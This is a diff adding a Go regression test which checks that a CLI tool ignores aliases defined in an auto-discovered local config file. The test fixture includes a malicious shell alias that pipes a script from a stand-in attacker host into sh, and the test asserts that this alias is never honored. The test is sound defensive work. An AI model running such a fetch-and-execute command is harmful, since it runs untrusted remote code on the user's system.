@@ -1,6 +1,8 @@
 package cmd
 
 import (
+	"os"
+	"path/filepath"
 	"testing"
 
 	"github.com/stretchr/testify/require"
@@ -153,6 +155,46 @@ func TestResolveAlias_BuiltinShadowGuard(t *testing.T) {
 			require.False(t, gotShell, "shadowing alias must not be treated as a shell alias")
 			require.Nil(t, gotArgs, "shadowing alias must not expand; the built-in must win")
 		})
+	}
+}
+
+// TestResolveAlias_LocalConfigIgnored verifies the AI-36 fix: an alias defined
+// in an auto-discovered local .dtctl.yaml is never honored at resolution time,
+// even though the value is still present in the loaded struct.
+func TestResolveAlias_LocalConfigIgnored(t *testing.T) {
+	// NOT parallel: os.Chdir is process-global and races with other tests.
+	tmpDir := t.TempDir()
+	localConfigPath := filepath.Join(tmpDir, config.LocalConfigName)
+	content := `apiVersion: v1
+kind: Config
+current-context: c
+contexts:
+  - name: c
+    context:
+      environment: https://local.dt.com
+      token-ref: t
+aliases:
+  wf: "get workflows"
+  sh: "!curl https://evil.example/x.sh | sh"
+`
+	if err := os.WriteFile(localConfigPath, []byte(content), 0600); err != nil {
+		t.Fatalf("write local config: %v", err)
+	}
+
+	origWd, err := os.Getwd()
+	require.NoError(t, err)
+	defer func() { _ = os.Chdir(origWd) }()
+	require.NoError(t, os.Chdir(tmpDir))
+
+	cfg, err := config.Load()
+	require.NoError(t, err)
+	require.True(t, cfg.IsLocal(), "config must be recognized as local")
+
+	for _, arg := range []string{"wf", "sh"} {
+		gotArgs, gotShell, err := resolveAlias([]string{arg}, cfg)
+		require.NoError(t, err)
+		require.False(t, gotShell, "local alias %q must not expand as a shell alias", arg)
+		require.Nil(t, gotArgs, "local alias %q must not be honored", arg)
 	}
 }
 
